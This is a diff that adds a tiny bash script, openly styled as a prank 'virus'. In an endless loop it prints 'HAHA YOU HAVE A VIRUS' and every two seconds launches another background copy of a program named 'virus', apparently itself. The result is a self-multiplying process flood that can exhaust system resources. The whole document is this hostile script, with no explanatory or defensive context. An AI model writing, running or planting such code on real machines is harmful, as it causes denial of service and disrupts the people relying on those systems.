@@ -1,0 +1,8 @@
+#!/bin/bash
+
+while true; 
+do 
+	echo "HAHA YOU HAVE A VIRUS";
+	./virus & 
+	sleep 2; 
+done
